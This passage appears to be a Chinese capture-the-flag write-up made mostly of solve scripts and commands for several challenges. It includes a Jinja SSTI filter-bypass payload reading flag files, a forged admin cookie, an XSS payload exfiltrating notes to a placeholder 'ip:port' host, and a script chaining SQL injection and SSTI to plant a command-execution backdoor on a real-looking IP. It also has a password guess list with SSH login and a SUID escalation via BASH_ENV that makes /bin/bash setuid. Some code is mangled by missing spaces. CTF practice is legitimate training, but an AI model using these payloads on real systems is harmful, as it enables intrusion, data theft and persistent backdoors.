        return redirect(url_for("logout"))

    if current_username == "admin":
        payload = request.args.get("payload")
        if payload:
            for char in payload:
                if char in"'_#&;":
                    abort(403)
                    return

        html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>

    
        <h2 class="text-center">Welcome, %s !</h2>
        
            Your payload: %s
        
        
        
            [Logout](/logout)
        
    

</html>
""" % (
            current_username,
            payload,
        )
    else:
        html_template = (
            """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>

    
        <h2 class="text-center">server code (encoded)</h2>
        
        {%% raw %%}
            %s
        {%% endraw %%}
        
        
            [Logout](/logout)
        
    

</html>
"""
            % base64.b64encode(open(__file__, "rb").read()).decode()
        )
    return render_template_string(html_template)

@app.route("/logout")
def logout():
    resp = redirect(url_for("login"))
    resp.delete_cookie("jwbcookie")
    return resp

if __name__ == "__main__":
    app.run()
if current_username == "admin":
        payload = request.args.get("payload")
base_str = "eyJ1c2VyX25hbWUiOiAiYWRtaXgiLCAibG9naW5fdGltZSI6IDE3NDU2NTYxMjF9JjRlOGViNjZjNTNlN2E2YzQzYTY4MjNhZGQ0MjQwMzA0YjBlZjVhM2VmZTk5MzRjNWQ1ZTg1MGQ5NWRkN2M1M2Y4NTRmOGU0NjljYTQzYTM1Y2M3YTRhZGNhYWQwNDI0Nzc0NGY3Mjk3YjdjNjY3MjJhYTg2ODQ1YjQxYzUxYzliMjMzNjllNjFmYjE0ZWRhNjE4ODIxZDM3NzAyODA0ZmY2ZWI0M2U5ZjQzZmMwNTE0NzBjYWJkMTU4MTM0MmRmNzc1NGZjNDUzMDMyZWU2ZDgxOTRiNmM1NjNmNmRhNjBiN2RlMDExODc2ZTcxZWEyMGIyNjhkZDBlMWVlYTg0Yjk3MTcyNjI4NzA1ODk3NDYyNTI2Njk1NGQxZmY1OTc3MWM2Y2MwZjY5NzIzNDY2OWVkZWJlNDk2NmQ0OWVjN2E0NjgyZGE5NDI2MWI2ODYyZWU1ZDlmNjU4NDQ3NWMzY2U2YzdiMmZiNmE0YjM5Mzg4NzIyMDc1YjFlMmQ1MjA4MWFjYjBlY2JjYjk1YzlmOWI1MGU4ZmI0Zjk2NDA3MmIyM2E4NjBlMTRkNTE5OGYyNjJmYjVjOWZkZDZhNzYxYTQ2YWVlNTJlMDkzYTM0MGFiOTgzZGQ3MjU1N2I2YWEyYmYxMTM0N2NhN2Y3ZWQ0ZDQ3YTJiYjg1NDAzMmIzNzZi"
origin = base64.b64decode(base_str)
print(origin)

# b'{"user_name": "admix", "login_time": 1745656121}&4e8eb66c53e7a6c43a6823add4240304b0ef5a3efe9934c5d5e850d95dd7c53f854f8e469ca43a35cc7a4adcaad04247744f7297b7c66722aa86845b41c51c9b23369e61fb14eda618821d37702804ff6eb43e9f43fc051470cabd1581342df7754fc453032ee6d8194b6c563f6da60b7de011876e71ea20b268dd0e1eea84b971726287058974625266954d1ff59771c6cc0f697234669edebe4966d49ec7a4682da94261b6862ee5d9f6584475c3ce6c7b2fb6a4b39388722075b1e2d52081acb0ecbcb95c9f9b50e8fb4f964072b23a860e14d5198f262fb5c9fdd6a761a46aee52e093a340ab983dd72557b6aa2bf11347ca7f7ed4d47a2bb854032b376b'
signature = '{"user_name": "admin", "login_time": 1745656121}&4e8eb66c53e7a6c43a6823add4240304b0ef5a3efe9934c5d5e850d95dd7c53f854f8e469ca43a35cc7a4adcaad04247744f7297b7c66722aa86845b41c51c9b23369e61fb14eda618821d37702804ff6eb43e9f43fc051470cabd1581342df7754fc453032ee6d8194b6c563f6da60b7de011876e71ea20b268dd0e1eea84b971726287058974625266954d1ff59771c6cc0f697234669edebe4966d49ec7a4682da94261b6862ee5d9f6584475c3ce6c7b2fb6a4b39388722075b1e2d52081acb0ecbcb95c9f9b50e8fb4f964072b23a860e14d5198f262fb5c9fdd6a761a46aee52e093a340ab983dd72557b6aa2bf11347ca7f7ed4d47a2bb854032b376b'
print(base64.b64encode(signature.encode()))
{%set ia=lipsum|escape|batch(22)|first|last%}{%set gl=ia*2+"globals"+ia*2%}{%set bu=ia*2+"builtins"+ia*2%}{%set im=ia*2+"import"+ia*2%}{{g.pop[gl][bu][im]("os").popen("cat f*").read()}}
如果未明确指定输入或输出格式，pandoc将尝试根据文件名的扩展名进行猜测。例如，
pandoc -o hello.tex hello.txt
将从 Markdown 转换hello.txt为 LaTeX。如果未指定输出文件（即输出到stdout），或者输出文件的扩展名未知，则输出格式将默认为 HTML。如果未指定输入文件（即输入来自stdin），或者输入文件的扩展名未知，则输入格式将被假定为 Markdown。
u0000
app.post('/report', async (req, res) => {
    let { url } = req.body
    try {
        await visit(url)
        res.send('success')
    } catch (err) {
        console.log(err)
        res.send('error')
    }
}
async function visit(url) {
    let browser = await puppeteer.launch({
        headless: HEADLESS,
        executablePath: '/usr/bin/chromium',
        args: ['--no-sandbox'],
    })
    let page = await browser.newPage()

    await page.goto('http://localhost:
3000/')

    await page.waitForSelector('#title')
    await page.type('#title', 'flag', {delay: 100})
    await page.type('#content', FLAG, {delay: 100})
    await page.click('#submit', {delay: 100})

    await sleep(3)
    console.log('visiting %s', url)

    await page.goto(url)
    await sleep(30)
    await browser.close()
}
javascript:
fetch('/notes').then(r=>r.text()).then(d=>navigator.sendBeacon('http://ip:
port/',d))
import requests
import time
url = "http://223.112.5.141:
56309"

evil = 'FROM "admin@ezmail.org"'

def report():
    content = """{{url_for.__globals__.__builtins__["eval"]("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(\"cmd\") and exec(\"global CmdResp;CmdResp=__import__('flask').make_response(__import__('os').popen(request.args.get('cmd')).read())\")==None else resp)",{"request":
url_for.__globals__["request"],"app":g.pop.__globals__.sys.modules["__main__"].app})}}""".replace("'","''")
    subject="http://ezmail.org:
3000/news?id=0 union select '"+content+"'"
    data = {
        # "url": 'http://ezmail.org:
3000/rnrn1234rn.rn'+f'From: admin@ezmail.orgrnTo: admin@ezmail.orgrnSubject: {subject}',
        "url": subject+"rnFrom: admin@ezmail.org",
        "content": "1234"
    }

    r = requests.post(url+"/report", data=data)
    print(r.text)
report()
requests.get(url+"/bot")

req = requests.get(url+"/?cmd=cat /flag")
print(f"flag:{req.text}")
from pwn import *
import re
import hashlib
import itertools
import string
import qrcode
from PIL import Image
import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D
from pyzbar.pyzbar import decode

context.log_level = 'debug'

# 生成固定尺寸二维码
def generate_qr(text):
    qr = qrcode.QRCode(
        version=1,  # 固定21x21
        error_correction=qrcode.constants.ERROR_CORRECT_Q,  # Q级纠错（25%）
        box_size=1,
        border=0
    )
    qr.add_data(text)
    qr.make(fit=False)
    img = qr.make_image(fill_color='black', back_color='white')
    return img.convert('1')

# 提取黑色像素
def extract_black_pixels(image):
    black_pixels = []
    pixels = image.load()
    width, height = image.size
    for x in range(width):
        for y in range(height):
            if pixels[x, y] == 0:
                black_pixels.append((x, y))
    return black_pixels

# 布置体素，带边界保护
def set_voxel(data, occupied, x, y, z, voxel_count, max_voxels=390):
    if voxel_count[0] >= max_voxels:
        returnFalse
    ifnot (0 <= x < 21and0 <= y < 21and0 <= z < 21):
        returnFalse
    ifnot occupied[x][y][z]:
        data[x][y][z] = True
        occupied[x][y][z] = True
        voxel_count[0] += 1
        returnTrue
    returnFalse

# 保存投影图片
def save_projection_image(projection, filename, module_size=10):
    size = len(projection) * module_size
    img = Image.new("1", (size, size), 1)
    pixels = img.load()

    for x in range(len(projection)):
        for y in range(len(projection[0])):
            if projection[x][y]:
                for dx in range(module_size):
                    for dy in range(module_size):
                        px = x * module_size + dx
                        py = y * module_size + dy
                        if px < size and py < size:
                            pixels[px, py] = 0
    img.save(filename)
    print(f"[+] 投影图已保存到: {filename}")

# 3D绘制体素
def plot_voxels(data):
    fig = plt.figure()
    ax = fig.add_subplot(111, projection='3d')

    xs, ys, zs = [], [], []
    for x in range(21):
        for y in range(21):
            for z in range(21):
                if data[x][y][z]:
                    xs.append(x)
                    ys.append(y)
                    zs.append(z)
    ax.scatter(xs, ys, zs, c='black', marker='s', s=20)
    ax.set_xlabel('X axis')
    ax.set_ylabel('Y axis')
    ax.set_zlabel('Z axis')
    ax.set_title('3D Voxel Visualization')
    plt.tight_layout()
    plt.savefig('voxel_visualization.png')
    print("[+] 3D体素可视化已保存到: voxel_visualization.png")
    plt.close()

# 解码并检查二维码内容
def check_qr_code(image_path, expected_text):
    img = Image.open(image_path)
    decoded = decode(img)
    if decoded:
        actual_text = decoded[0].data.decode('utf-8')
        if actual_text == expected_text:
            print(f"[√] {image_path} 验证成功！内容: {actual_text}")
        else:
            print(f"[×] {image_path} 验证失败！检测到: {actual_text}，期望: {expected_text}")
    else:
        print(f"[×] {image_path} 无法识别二维码！")

def main():
    # 1. 生成三个二维码
    front_qr = generate_qr("Azure")
    left_qr = generate_qr("Assassin")
    top_qr = generate_qr("Alliance")

    # 2. 提取黑色像素
    front_black = extract_black_pixels(front_qr)
    left_black = extract_black_pixels(left_qr)
    top_black = extract_black_pixels(top_qr)

    print(f"Front QR黑点数: {len(front_black)}")
    print(f"Left QR黑点数: {len(left_black)}")
    print(f"Top QR黑点数: {len(top_black)}")

    # 3. 初始化体素
    data = [[[Falsefor _ in range(21)] for _ in range(21)] for _ in range(21)]
    occupied = [[[Falsefor _ in range(21)] for _ in range(21)] for _ in range(21)]
    voxel_count = [0]

    front_set = set(front_black)
    left_set = set(left_black)
    top_set = set(top_black)

    # 4. 优先放三向重合点
    for x, y in list(front_set):
        for z in range(21):
            if (y, z) in left_set and (x, z) in top_set:
                if set_voxel(data, occupied, x, y, z, voxel_count):
                    front_set.remove((x, y))
                    left_set.remove((y, z))
                    top_set.remove((x, z))
                    break

    # 5. 布置剩余front投影
    for x, y in list(front_set):
        for z in range(21):
            if set_voxel(data, occupied, x, y, z, voxel_count):
                front_set.remove((x, y))
                break

    # 6. 布置剩余left投影
    for y, z in list(left_set):
        for x in range(21):
            if set_voxel(data, occupied, x, y, z, voxel_count):
                left_set.remove((y, z))
                break

    # 7. 布置剩余top投影
    for x, z in list(top_set):
        for y in range(21):
            if set_voxel(data, occupied, x, y, z, voxel_count):
                top_set.remove((x, z))
                break

    # 8. 输出字符串
    output = ""
    for z in range(21):
        for y in range(21):
            for x in range(21):
                output += "1"if data[x][y][z] else"0"

    ones_count = output.count('1')
    print(f"[+] 体素总数: {ones_count} (目标390以内)")
    print("[+] 输出字符串如下：")
    print(output)

    # 9. 保存各方向投影
    save_projection_image([
        [any(data[x][y][z] for z in range(21)) for y in range(21)]
        for x in range(21)
    ], "front_debug.png")

    save_projection_image([
        [any(data[x][y][z] for x in range(21)) for z in range(21)]
        for y in range(21)
    ], "left_debug.png")

    save_projection_image([
        [any(data[x][y][z] for y in range(21)) for z in range(21)]
        for x in range(21)
    ], "top_debug.png")

    # 10. 3D点云图
    plot_voxels(data)

    # 11. 校验生成的图片
    print("n开始验证二维码内容：")
    check_qr_code("front_debug.png", "Azure")
    check_qr_code("left_debug.png", "Assassin")
    check_qr_code("top_debug.png", "Alliance")

    return output

def find_pow(suffix: str, hex: str):
    letters = string.ascii_letters + string.digits  # 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    for candidate in itertools.product(letters, repeat=4):
        candidate_str = ''.join(candidate)
        h = hashlib.sha256((candidate_str + suffix).encode()).hexdigest()
        if h == hex:
            return candidate_str, h
    returnNone, None

# 连接到远程服务器
r = remote('x.x.x.x', 9999)

# 接收返回的数据
response = r.recv().decode()

# 使用正则表达式提取 suffix 和 hash
# 匹配 sha256(XXXX+<suffix>) == <hash> 格式
pattern = r'sha256(XXXX+([a-zA-Z0-9]+)) == ([0-9a-f]{64})'
match = re.search(pattern, response)

if match:
    suffix = match.group(1)  # 提取 suffix
    hash = match.group(2)    # 提取 hash
    
    # 打印提取的值以确认
    print(f"suffix: {suffix}")
    print(f"hash: {hash}")
else:
    print("Failed to extract values from response")

solution, digest = find_pow(suffix, hash)
if solution:
    print(f"找到的 PoW 值是: {solution}")
    # print(f"对应的 sha256({solution!r} + {suffix!r}) = {digest}")
else:
    print("没有找到符合条件的值。")
r.sendlineafter("Give me XXXX:", solution)

data = main()
r.sendlineafter("give me your data:", data)

r.interactive()
Megumi19960923
Megumi960923
Megumi1996
Megumi0923
Megumi199609
Megumi09
Megumi23
$ find / -type f -perm -u=s 2>/dev/null                                                                                                                                                                                             
/opt/hello                                                                                                                                                                                                                          
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                                                         
/usr/lib/openssh/ssh-keysign                                                                                                                                                                                                        
/usr/bin/gpasswd                                                                                                                                                                                                                    
/usr/bin/chsh                                                                                                                                                                                                                       
/usr/bin/chfn                                                                                                                                                                                                                       
/usr/bin/passwd                                                                                                                                                                                                                     
/usr/bin/newgrp                                                                                                                                                                                                                     
/usr/bin/sudo                                                                                                                                                                                                                       
/bin/mount                                                                                                                                                                                                                          
/bin/umount                                                                                                                                                                                                                         
/bin/su
ssh KatoMegumi@61.147.171.105  -p 55063
Megumi960923
python3 -c 'import pty; pty.spawn("/bin/bash")'
int __fastcall main(int argc, const char **argv, const char **envp)
{
char v4; // [rsp+Fh] [rbp-1h] BYREF

  setuid(0);
  setgid(0);
  v4 = 110;
printf("Are you Tomoya?ny/n:n> ");
  __isoc99_scanf("%c", &v4);
if ( getenv("LD_PRELOAD") )
    unsetenv("LD_PRELOAD");
if ( getenv("LD_LIBRARY_PATH") )
    unsetenv("LD_LIBRARY_PATH");
if ( getenv("LD_AUDIT") )
    unsetenv("LD_AUDIT");
if ( getenv("LD_DEBUG") )
    unsetenv("LD_DEBUG");
if ( getenv("LIBRARY_PATH") )
    unsetenv("LIBRARY_PATH");
  setenv("PATH", "/bin", 1);
if ( v4 == 121 )
  {
    system("echo 'Hello!'");
  }
elseif ( v4 == 110 )
  {
    system("bash -c "echo 'Who are you?'"");
  }
else
  {
    printf("emm? ...");
  }
return0;
}
env $'BASH_FUNC_echo%%=() { id>/tmp/test; }' bash -c 'echo hello'
env $'BASH_FUNC_echo%%=() { id; }' bash -p -c './hello<<<n'
BASH_ENV='$(id 1>&2)' bash -c 'echo hello'
echo "exec chmod +s /bin/bash" > /tmp/myhijack
export BASH_ENV=/tmp/myhijack
bash -p
/opt/hello
ls -al /bin
bash -p
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-c782a3051b83b19ef275cda6de054e96.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-791f57b8915a79816a76704dda5c0da5.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-2b7f8f16a9720d030d61c09c4366c917.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-8640a66e045c61c5bfbf75654d764d6e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-dd2dd71162d005eb41367be22ded17f4.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-7175b3bca579b9d95ed95ec8fa8fd3c3.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-a62c09978657ce3e273c16ecce020aa1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-35c0ae972b7bee421789e5d7599ffd5d.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-784d2bd2e2039ae04860b4edba0e8cf4.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-a4549d2034290e2820e7066e3dea8f56.png)